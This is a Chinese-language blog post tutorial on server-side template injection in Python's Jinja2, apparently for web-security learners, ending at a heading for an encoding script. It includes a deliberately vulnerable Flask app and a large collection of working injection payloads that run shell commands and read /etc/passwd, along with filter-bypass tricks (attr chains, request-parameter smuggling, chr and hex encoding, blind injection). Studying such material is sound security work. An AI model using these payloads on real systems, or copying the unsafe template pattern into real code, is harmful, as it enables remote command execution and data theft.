<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    
    
    <title>web安全-SSTI | Wisejay | To be better</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="web安全">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Wisejay</h5>
          <a href="mailto:1418084893@qq.com" title="1418084893@qq.com" class="mail">
            
              <span>1</span>
            
              <span>4</span>
            
              <span>1</span>
            
              <span>8</span>
            
              <span>0</span>
            
              <span>8</span>
            
              <span>4</span>
            
              <span>8</span>
            
              <span>9</span>
            
              <span>3</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                首页
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                分类
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                标签
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                归档
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                关于
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>web安全-SSTI</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">web安全-SSTI</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-02-06T10:41:01.863Z" itemprop="datePublished" class="page-time">
  2021-02-06
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web安全/">web安全</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-SSTI"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">web安全-SSTI</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-02-06 18:41:01" datetime="2021-02-06T10:41:01.863Z"  itemprop="datePublished">2021-02-06</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web安全/">web安全</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><blockquote>
<p>Author:<code>wisejay</code></p>
<p>Email:<code>wisejay@foxmail.com</code></p>
</blockquote>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p>模板引擎可以简单理解是用特定的符号来占位(变量)，通过模板引擎置换后，把占位符号换成具体内容后，返回给用户。</p>
<h3 id="SSTI-服务器端模板注入（Server-Side-Template-Injection）"><a href="#SSTI-服务器端模板注入（Server-Side-Template-Injection）" class="headerlink" title="SSTI 服务器端模板注入（Server-Side Template Injection）"></a>SSTI 服务器端模板注入（Server-Side Template Injection）</h3><p>SSTI利用的是现在的网站模板引擎，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 、mako、tornado、django和PHP的smarty、twig以及JAVA的jade、velocity、freemarker、thymeleaf等等。</p>
<p><strong>本文以Python的jinja2 为例</strong></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ul>
<li>{%%}：主要用来声明变量，也可以用于条件语句和循环语句</li>
<li>{{}}：用于将表达式打印到模板输出</li>
<li>{##}：表示未包含在模板输出中的注释</li>
<li>##：和{%%}相同的效果</li>
</ul>
<h3 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h3><ul>
<li><code>__class__</code>：用于返回对象所属的类</li>
<li><code>__base__</code>：以字符串的形式返回一个类所继承的类</li>
<li><code>__bases__</code>：以元组的形式返回一个类所继承的类</li>
<li><code>__mro__</code>：返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类</li>
<li><code>__subclasses__()</code>：获取类的所有子类</li>
<li><code>__init__</code>：所有自带带类都包含<code>init</code>方法，常用他当跳板来调用<code>globals</code></li>
<li><code>__globals__</code>：会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合<code>init</code>使用</li>
</ul>
<h2 id="漏洞形成与防护"><a href="#漏洞形成与防护" class="headerlink" title="漏洞形成与防护"></a>漏洞形成与防护</h2><h3 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h3><ul>
<li>用户输入内容可控</li>
<li>没有使用固定模板</li>
</ul>
<p>测试环境：<code>ssti.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    <span class="comment">#print(name,request.args,request.values,request.cookies,request.form,request.headers)</span></span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        t = Template(<span class="string">"Hello：%s"</span>%(name))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Template(<span class="string">"Hello,What's your name"</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>我们访问网站，并给name传值<code>49</code>，看到返回结果是49，这里就存在了SSTI</p>
<figure class="image-box">
                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127132753924.png" title="image-20210127132753924" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127132753924.png" alt="image-20210127132753924" title class></a>
                <p>image-20210127132753924</p>
            </figure>

<h3 id="构造链路"><a href="#构造链路" class="headerlink" title="构造链路"></a>构造链路</h3><h4 id="获取对象所属的类"><a href="#获取对象所属的类" class="headerlink" title="获取对象所属的类"></a>获取对象所属的类</h4><p>可以通过使用<code>str</code>，<code>dict</code>,<code>tuple</code>，<code>list</code>等等</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;&#125;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取基类"><a href="#获取基类" class="headerlink" title="获取基类"></a>获取基类</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取子类"><a href="#获取子类" class="headerlink" title="获取子类"></a>获取子类</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="寻找利用类脚本"><a href="#寻找利用类脚本" class="headerlink" title="寻找利用类脚本"></a>寻找利用类脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">search = <span class="string">'popen'</span>  <span class="comment">#方法名称</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">''</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i,num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;class &#39;os._wrap_close&#39;&gt; 128</code>返回方法位置，表示在基类的第128个子类名称为<code>os._wrap_close</code>中</p>
<h4 id="构造语句"><a href="#构造语句" class="headerlink" title="构造语句"></a>构造语句</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用构造的语句可以查看到<code>whoami</code>命令执行的结果</p>
<figure class="image-box">
                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127172339276.png" title="image-20210127172339276" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127172339276.png" alt="image-20210127172339276" title class></a>
                <p>image-20210127172339276</p>
            </figure>

<p>如果需要构造其他方法，我们也是使用同样的方法，先找到方法的位置，进行构造即可。</p>
<h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><p>python2和python3的区别</p>
<ul>
<li>python2中的<code>string</code>不直接属于基类需要两次调用返回继承类才找得到基类<code>&#39;&#39;.__class__.__base__.__base__</code></li>
<li>python3中移除了file类，所以在python3中file类读写不能使用</li>
</ul>
<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读取文件</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'open'</span>](<span class="string">'/etc/passwd'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#python2,file类</span></span><br><span class="line">&#123;&#123;[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#popen与system区别：popen可以看到返回结果，system只返回结果值即成功是0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#popen</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#os</span></span><br><span class="line">&#123;&#123;<span class="string">""</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">196</span>].__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#__import__</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">"__import__"</span>](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过__builtins__利用eval和__import__</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__.eval(<span class="string">"__import__('os').popen('whoami').read()"</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__.__import__(<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a>常用绕过</h4><h5 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号 [ ]"></a>过滤中括号 <code>[ ]</code></h5><ul>
<li>利用<code>pop()</code> 或<code>__getitem__()</code>绕过</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__().pop(<span class="number">75</span>).__init__.__globals__.__builtins__.eval(<span class="string">"__import__('os').popen('whoami').read()"</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">75</span>).__init__.__globals__.__builtins__.eval(<span class="string">"__import__('os').popen('whoami').read()"</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">75</span>).__init__.__globals__.__getitem__(<span class="string">'__builtins__'</span>).__getitem__(<span class="string">'__import__'</span>)(<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="过滤句号"><a href="#过滤句号" class="headerlink" title="过滤句号."></a>过滤句号<code>.</code></h5><ul>
<li>利用<code>|attr()</code>函数</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&#123;&#123;().__class__&#125;&#125;和&#123;&#123;()|attr('__class__')&#125;&#125;是同等</span></span><br><span class="line">&#123;&#123;()|attr(<span class="string">'__class__'</span>)|attr(<span class="string">'__base__'</span>)|attr(<span class="string">'__subclasses__'</span>)()|attr(<span class="string">'__getitem__'</span>)(<span class="number">75</span>)|attr(<span class="string">'__init__'</span>)|attr(<span class="string">'__globals__'</span>)|attr(<span class="string">'__getitem__'</span>)(<span class="string">'__builtins__'</span>)|attr(<span class="string">'__getitem__'</span>)(<span class="string">'eval'</span>)(<span class="string">'__import__("os").popen("whoami").read()'</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#123;().__class__&#125;&#125;和&#123;【['__class__']&#125;&#125;同等</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[<span class="string">'__class__'</span>][<span class="string">'__base__'</span>][<span class="string">'__subclasses__'</span>]()[<span class="number">128</span>][<span class="string">'__init__'</span>][<span class="string">'__globals__'</span>][<span class="string">'popen'</span>](<span class="string">'whoami'</span>)[<span class="string">'read'</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线_"></a>过滤下划线<code>_</code></h5><ul>
<li>利用Flask request 属性详解</li>
</ul>
<blockquote>
<p>request.args.name<br>request.values.name<br>request.cookies.name<br>request.headers.name<br>request.form.name</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.args.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.args.x1][request.args.x2][request.args.x3]()[<span class="number">75</span>][request.args.x4][request.args.x5][request.args.x6][request.args.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__init__&amp;x5=__globals__&amp;x6=__builtins__&amp;x7=__import__</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130001424350.png" title="image-20210130001455460" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130001424350.png" alt="image-20210130001455460" title class></a>
                <p>image-20210130001455460</p>
            </figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.values.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.values.x1][request.values.x2][request.values.x3]()[<span class="number">75</span>][request.values.x4][request.values.x5][request.values.x6][request.values.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__init__&amp;x5=__globals__&amp;x6=__builtins__&amp;x7=__import__</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130001455460.png" title="image-20210130001424350" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130001455460.png" alt="image-20210130001424350" title class></a>
                <p>image-20210130001424350</p>
            </figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.cookies.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.cookies.x1][request.cookies.x2][request.cookies.x3]()[<span class="number">75</span>][request.cookies.x4][request.cookies.x5][request.cookies.x6][request.cookies.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127174548390.png" title="image-20210130000229618" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127174548390.png" alt="image-20210130000229618" title class></a>
                <p>image-20210130000229618</p>
            </figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.headers.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.headers.x1][request.headers.x2][request.headers.x3]()[<span class="number">75</span>][request.headers.x4][request.headers.x5][request.headers.x6][request.headers.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130000229618.png" title="image-20210129235820486" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130000229618.png" alt="image-20210129235820486" title class></a>
                <p>image-20210129235820486</p>
            </figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.form.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.form.x1][request.form.x2][request.form.x3]()[<span class="number">75</span>][request.form.x4][request.form.x5][request.form.x6][request.form.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130002010844.png" title="image-20210130002010844" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130002010844.png" alt="image-20210130002010844" title class></a>
                <p>image-20210130002010844</p>
            </figure>

<h5 id="过滤花括号"><a href="#过滤花括号" class="headerlink" title="过滤花括号"></a>过滤花括号{{}}</h5><ul>
<li>利用{%%}绕过

</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过盲注方法</span></span><br><span class="line">&#123;%i<span class="string">f""</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()[0]=='w'"</span>)%&#125;success&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<h5 id="过滤引号-39-和-quot"><a href="#过滤引号-39-和-quot" class="headerlink" title="过滤引号&#39;和&quot;"></a>过滤引号<code>&#39;</code>和<code>&quot;</code></h5><ul>
<li>利用chr绕过</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr = ().__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__.popen(chr(<span class="number">119</span>)%<span class="number">2</span>bchr(<span class="number">104</span>)%<span class="number">2</span>bchr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">109</span>)%<span class="number">2</span>bchr(<span class="number">105</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>构造chr小脚本</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'whoami'</span></span><br><span class="line"><span class="comment"># s为要编码内容，%2b表示+连接的意思</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_chr</span><span class="params">(s)</span>:</span></span><br><span class="line">    c = <span class="string">''</span> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        c += <span class="string">'chr('</span>+str(ord(i))+<span class="string">')%2b'</span></span><br><span class="line">    <span class="keyword">return</span> c[<span class="number">0</span>:<span class="number">-3</span>]	<span class="comment">#去掉最后一个%2b</span></span><br><span class="line"></span><br><span class="line">print(encode_chr(s))</span><br></pre></td></tr></table></figure>

<h5 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用字符串拼接绕过</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[<span class="string">'__cla'</span><span class="string">'ss__'</span>].__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>[<span class="string">'__cla'</span>+<span class="string">'ss__'</span>].__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__getattribute__(<span class="string">"__cla"</span>+<span class="string">"ss__"</span>).__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment">#编码绕过</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[<span class="string">'\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f'</span>][<span class="string">'__base__'</span>][<span class="string">'__subclasses__'</span>]()[<span class="number">128</span>][<span class="string">'__init__'</span>][<span class="string">'__globals__'</span>][<span class="string">'popen'</span>](<span class="string">'whoami'</span>)[<span class="string">'read'</span>]()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#用__enter__或__exit__替代__init__</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__enter__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__exit__.__globals__[<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>构造编码小脚本</code></p>
